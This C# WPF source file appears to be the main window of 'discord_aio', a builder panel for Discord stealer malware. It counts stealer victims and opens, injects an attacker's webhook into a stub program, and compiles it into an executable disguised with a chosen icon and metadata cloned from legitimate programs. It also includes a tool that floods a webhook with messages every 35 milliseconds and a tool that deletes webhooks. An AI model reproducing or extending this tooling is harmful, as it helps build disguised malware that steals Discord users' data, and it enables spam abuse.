using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Sockets;
using System.ComponentModel;
using System.Net.Http.Headers;
using Newtonsoft.Json.Linq;
using Path = System.IO.Path;
using Microsoft.IdentityModel.Tokens;
using System.Linq.Expressions;
using System.Threading;

namespace discord_aio_release
{
    public partial class MainWindow : Window
    {
        private protected string _serializedToken { get; set; }
        private protected string _DP { get; set; }
        private System.Windows.Threading.DispatcherTimer _timer;
        public MainWindow(string _v, string hwid, string serializedToken, string _DAIO)
        {
            InitializeComponent();
            settings_shadow.Opacity = 0;
            builder_shadow.Opacity = 0;
            webhooks_shadow.Opacity = 0;
            builder_site.Visibility = Visibility.Collapsed;
            webhooks_site.Visibility = Visibility.Collapsed;
            hover_elipse.Opacity = 0;
            version_label.Content = _v + " " + hwid.ToUpper();
            username_label.Content = Environment.UserName;
            _serializedToken = serializedToken;
            _DP = _DAIO;
            avatarHandler();
            WebHandler();
            this.metadata = new Metadata(this.ranChars);
            RefTick();
            _timer = new System.Windows.Threading.DispatcherTimer();
            _timer.Interval = TimeSpan.FromMinutes(15);
            _timer.Tick += tTick;
            _timer.Start();
        }

        private readonly Metadata metadata;
        private readonly RandomCharacters ranChars;
        private string Title { get; set; }
        private string Description { get; set; }
        private string Product { get; set; }
        private string Company { get; set; }
        private string Copyright { get; set; }
        private string Trademark { get; set; }
        private string MajorVersion { get; set; }
        private string MinorVersion { get; set; }
        private string BuildPart { get; set; }
        private string PrivatePart { get; set; }

        private async void RefTick()
        {
            HttpClient _client = new HttpClient();
            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _serializedToken);
            HttpResponseMessage response = await _client.GetAsync("APIURL");
            response.EnsureSuccessStatusCode();
            string resBody = await response.Content.ReadAsStringAsync();
            JObject jsonObj = JObject.Parse(resBody);
            users_count.Content = jsonObj["total_Users"].ToString();
            stealers_count1.Content = jsonObj["total_Stealers"].ToString();
            opens_count.Content = jsonObj["total_Opens"].ToString();
            active_count.Content = jsonObj["active_Users"].ToString();
        }

        private async void tTick(object sender, EventArgs e)
        {
            RefTick();
        }

        private async void WebHandler()
        {
            string warning_url = "WARNING";
            using (HttpClient client = new HttpClient())
            {
                // Warning logic
                try
                {
                    HttpResponseMessage response = await client.GetAsync(warning_url);
                    string responseString = await response.Content.ReadAsStringAsync();

                    if (responseString == "")
                        warning.Opacity = 0;

                    warning_label.Content = responseString;
                }
                catch 
                {
                    warning_label.Content = "An error occured. Please, contact the developers.";
                }
            }
        }

        private async void avatarHandler()
        {
            string avPath = Path.Combine(_DP, "avatar.png");
            if (File.Exists(avPath))
            {
                BitmapImage img = new BitmapImage(new Uri(Path.Combine(_DP, "avatar.png")));
                WriteableBitmap tImg = new WriteableBitmap(img);
                user_avatar.ImageSource = tImg;
            }
        }

        // Buttons animation
        DoubleAnimation anim = new DoubleAnimation
        {
            From = 0.1,
            To = 1,
            Duration = new Duration(TimeSpan.FromSeconds(0.5)),
            AutoReverse = false
        };


        // Dragging the window
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left && e.OriginalSource is FrameworkElement source && source.Name != "hover_elipse")
                this.DragMove();
        }

        // Dashboard button
        private void dashboard_button_Click(object sender, RoutedEventArgs e)
        {
            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
            builder_shadow.Opacity = 0;
            builder_site.Visibility = Visibility.Collapsed;
            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
            webhooks_shadow.Opacity = 0;
            webhooks_site.Visibility = Visibility.Collapsed;
            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
            settings_shadow.Opacity = 0;

            dashboard_image.BeginAnimation(OpacityProperty, anim);
            dashboard_image.Source = this.FindResource("dashboard_colored") as ImageSource;
            dashboard_shadow.Opacity = 1;
            dashboard_site.Visibility = Visibility.Visible;
        }

        // Builder button
        private void builder_button_Click(object sender, RoutedEventArgs e)
        {
            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
            dashboard_shadow.Opacity = 0;
            dashboard_site.Visibility = Visibility.Collapsed;
            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
            webhooks_shadow.Opacity = 0;
            webhooks_site.Visibility = Visibility.Collapsed;
            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
            settings_shadow.Opacity = 0;

            builder_image.BeginAnimation(OpacityProperty, anim);
            builder_image.Source = this.FindResource("dToolDrawingImage") as ImageSource;
            builder_shadow.Opacity = 1;
            builder_site.Visibility = Visibility.Visible;
        }

        // Webhooks button
        private void webhooks_button_Click(object sender, RoutedEventArgs e)
        {
            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
            dashboard_shadow.Opacity = 0;
            dashboard_site.Visibility = Visibility.Collapsed;
            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
            builder_shadow.Opacity = 0;
            builder_site.Visibility = Visibility.Collapsed;
            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
            settings_shadow.Opacity = 0;

            webhooks_image.BeginAnimation(OpacityProperty, anim);
            webhooks_image.Source = this.FindResource("webhook_colored") as ImageSource;
            webhooks_shadow.Opacity = 1;
            webhooks_site.Visibility = Visibility.Visible;
        }

        // Settings button
        private void settings_button_Click(object sender, RoutedEventArgs e)
        {
            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
            dashboard_shadow.Opacity = 0;
            dashboard_site.Visibility = Visibility.Collapsed;
            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
            builder_shadow.Opacity = 0;
            builder_site.Visibility = Visibility.Collapsed;
            webhooks_image.Source = this.FindResource("webhook_ncolored") as ImageSource;
            webhooks_shadow.Opacity = 0;
            webhooks_site.Visibility = Visibility.Collapsed;

            settings_image.BeginAnimation(OpacityProperty, anim);
            settings_image.Source = this.FindResource("dSetsDrawingImage") as ImageSource;
            settings_shadow.Opacity = 1;
        }

        // Exit button
        private void exit_button_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }

        // Webhook checker
        private void webhook_button_Click(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input.Text) && !String.IsNullOrWhiteSpace(webhook_input.Text))
            {
                try
                {
                    string wh_ = new WebClient().DownloadString(webhook_input.Text);
                    MessageBox.Show("valid");
                }
                catch { MessageBox.Show("not valid"); }
            }
        }

        private void generate_button_Click(object sender, RoutedEventArgs e)
        {
            FileMetadata meta = metadata.randomMetadata();
            Title = meta.Title;
            Description = meta.Description;
            Product = meta.Product;
            Company = meta.Company;
            Copyright = meta.Copyright;
            Trademark = meta.Trademark;
            MajorVersion = meta.MajorVersion;
            MinorVersion = meta.MinorVersion;
            BuildPart = meta.BuildPart;
            PrivatePart = meta.PrivatePart;

            metadata_label.Content = Description;
        }

        private void clone_button_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog cloneDialog = new OpenFileDialog();
                cloneDialog.Filter = "Executable (*.exe)|*.exe";

                bool? dialogResult = cloneDialog.ShowDialog();
                if (dialogResult == true)
                {
                    string path = Path.GetFullPath(cloneDialog.FileName);

                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);

                    Title = info.OriginalFilename;
                    Description = info.FileDescription;
                    Product = info.ProductName;
                    Company = info.CompanyName;
                    Copyright = info.LegalCopyright;
                    Trademark = info.LegalTrademarks;
                    MajorVersion = info.FileMajorPart.ToString();
                    MinorVersion = info.FileMinorPart.ToString();
                    BuildPart = info.FileBuildPart.ToString();
                    PrivatePart = info.FilePrivatePart.ToString();
                }

                if (Description == "")
                    metadata_label.Content = Product;
                else
                    metadata_label.Content = Description;
            }
            catch {}

        }

        private void icon_button_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog iconDialog = new OpenFileDialog();
                iconDialog.Title = "Select icon";
                iconDialog.Filter = "Icon (*.ico)|*.ico";

                bool? dialogResult = iconDialog.ShowDialog();
                if (dialogResult == true)
                {
                    icon_label.Content = iconDialog.FileName;
                }
            }
            catch { }
        }

        private async void build_button_Click(object sender, RoutedEventArgs e)
        {
            if (!(metadata_label.Content.ToString() == "None") && !string.IsNullOrEmpty(metadata_label.Content.ToString()))
            {
                try
                {
                    SaveFileDialog builder = new SaveFileDialog();
                    builder.Filter = "Executable (*.exe)|*.exe";

                    bool? builderResult = builder.ShowDialog();
                    if (builderResult == true)
                    {
                        string iconLabel = icon_label.Content.ToString();
                        string appIcon = "none";
                        if (iconLabel != "None" && !string.IsNullOrEmpty(iconLabel))
                            appIcon = iconLabel;

                        if (File.Exists(Path.Combine(_DP, "stub.cs")))
                            File.Delete(Path.Combine(_DP, "stub.cs"));

                        string main_sc = File.ReadAllText(Path.Combine(_DP, "Program.cs"));
                        main_sc = main_sc.Replace("%WEBHOOK%", webhook_input.Text); // Changing the webhook

                        File.WriteAllText(Path.Combine(_DP, "stub.cs"), main_sc);

                        string arguments = $"{_serializedToken} {builder.FileName} {appIcon}";
                        Process.Start(_DP + "\\daioCompiler.exe", arguments);
                    }
                }
                catch { }
            }
        }

        private void hover_elipse_MouseEnter(object sender, MouseEventArgs e)
        {
            hover_elipse.Opacity = 1;
            this.Cursor = Cursors.Hand;
        }

        private void hover_elipse_MouseLeave(object sender, MouseEventArgs e)
        {
            hover_elipse.Opacity = 0;
            this.Cursor = Cursors.Arrow;
        }

        private void hover_elipse_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            string avatarPath = Path.Combine(_DP, "avatar.png");
            try
            {
                OpenFileDialog avatarDialog = new OpenFileDialog();
                avatarDialog.Title = "Select avatar";
                avatarDialog.Filter = "Image (*.png)|*.png";

                bool? dialogResult = avatarDialog.ShowDialog();
                if (dialogResult == true)
                {
                    File.Copy(avatarDialog.FileName, avatarPath, true);
                    BitmapImage img = new BitmapImage(new Uri(avatarPath));
                    WriteableBitmap tImg = new WriteableBitmap(img);
                    user_avatar.ImageSource = tImg;
                }
            }
            catch { MessageBox.Show("Please wait a moment before proceeding with this action."); }
        }

        private string wh_msg_title { get; set; }
        private string wh_msg_desc { get; set; }
        private string wh_msg_user { get; set; }

        private void webhook_button2_Click(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
            {
                try
                {
                    string wh_ = new WebClient().DownloadString(webhook_input2.Text);
                    MessageBox.Show("valid");
                }
                catch { MessageBox.Show("not valid"); }
            }
        }

        private async void webhook_send_msg(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
            {
                if (!String.IsNullOrEmpty(msg_title_input.Text) && !String.IsNullOrWhiteSpace(msg_title_input.Text)
                    && !String.IsNullOrEmpty(msg_desc_input.Text) && !String.IsNullOrWhiteSpace(msg_desc_input.Text)
                    && !String.IsNullOrEmpty(msg_user_input.Text) && !String.IsNullOrWhiteSpace(msg_user_input.Text))
                {
                    try
                    {
                        HttpClient webhookClient = new HttpClient();
                        webhookClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

                        string content = (@"{""embeds"": [{""title"": ""{0}"",""description"": ""{1}"",""color"": 393130}],""username"": ""{2}""}").Replace("{0}", msg_title_input.Text).Replace("{1}", msg_desc_input.Text).Replace("{2}", msg_user_input.Text);
                        var data = new StringContent(content, Encoding.UTF8, "application/json");

                        HttpResponseMessage res = await webhookClient.PostAsync(webhook_input2.Text, data);
                    }
                    catch { }
                }
            }
        }

        private async void webhook_delete(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
            {
                try
                {
                    HttpClient webhookClient = new HttpClient();
                    HttpResponseMessage res = await webhookClient.DeleteAsync(webhook_input2.Text);
                    MessageBox.Show("Webhook deleted.");
                }
                catch { }
            }
        }

        private bool masMsgActive = false;

        private async void webhook_send_massive_msg(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
            {
                if (!String.IsNullOrEmpty(msg_title_input.Text) && !String.IsNullOrWhiteSpace(msg_title_input.Text)
                    && !String.IsNullOrEmpty(msg_desc_input.Text) && !String.IsNullOrWhiteSpace(msg_desc_input.Text)
                    && !String.IsNullOrEmpty(msg_user_input.Text) && !String.IsNullOrWhiteSpace(msg_user_input.Text))
                {
                    if (!masMsgActive) 
                    {
                        string post_webhook = webhook_input2.Text;

                        HttpClient webhookClient = new HttpClient();
                        webhookClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

                        string content = (@"{""embeds"": [{""title"": ""{0}"",""description"": ""{1}"",""color"": 393130}],""username"": ""{2}""}").Replace("{0}", msg_title_input.Text).Replace("{1}", msg_desc_input.Text).Replace("{2}", msg_user_input.Text);
                        var data = new StringContent(content, Encoding.UTF8, "application/json");

                        masMsgActive = true;
                        start_wb_button.Content = "S T A R T E D";
                        stop_wb_button.Content = "S T O P";

                        await Task.Run(async () =>
                        {
                            CancellationTokenSource cts = new CancellationTokenSource();
                            while (masMsgActive)
                            {
                                try
                                {
                                    HttpResponseMessage res = await webhookClient.PostAsync(post_webhook, data);
                                    await Task.Delay(35);
                                }
                                catch
                                {
                                    masMsgActive = false;
                                    await Task.Delay(500);
                                    masMsgActive = true;
                                }
                            }
                            cts.Cancel();
                        });
                    }
                }
            }
        }

        private void webhook_stop_massive_msg(object sender, RoutedEventArgs e)
        {
            if (masMsgActive)
            {
                masMsgActive = false;
                start_wb_button.Content = "S T A R T";
                stop_wb_button.Content = "S T O P P E D";
                MessageBox.Show("Massive messaging stopped.");
            }
        }
    }
}
